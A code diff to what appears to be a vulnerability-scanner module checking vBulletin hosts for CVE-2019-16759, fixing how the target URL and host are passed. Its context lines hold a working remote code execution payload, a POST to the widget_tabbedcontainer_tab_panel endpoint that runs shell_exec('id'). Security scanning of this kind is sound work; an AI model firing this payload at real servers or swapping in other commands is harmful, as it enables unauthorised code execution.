@@ -80,7 +80,7 @@ def vbulletin_vuln(
     scan_cmd,
 ):
     try:
-        s = conn(target, port, timeout_sec, socks_proxy)
+        s = conn(target_to_host(target), port, timeout_sec, socks_proxy)
         if not s:
             return False
         else:
@@ -119,6 +119,8 @@ def vbulletin_vuln(
                         "subWidgets[0][template]": "widget_php",
                         "subWidgets[0][config][code]": 'echo shell_exec("id"); exit;',
                     }
+                    if target.endswith("/"):
+                        target = target[:-1]
                     r = requests.post(
                         url=target + "/ajax/render/widget_tabbedcontainer_tab_panel",
                         data=params,
@@ -224,8 +226,6 @@ def start(
         extra_requirements = new_extra_requirements
         if ports is None:
             ports = extra_requirements["vbulletin_cve_2019_16759_vuln_ports"]
-        if target_type(target) == "HTTP":
-            target = target_to_host(target)
         threads = []
         total_req = len(ports)
         thread_tmp_filename = "{}/tmp/thread_tmp_".format(load_file_path()) + "".join(
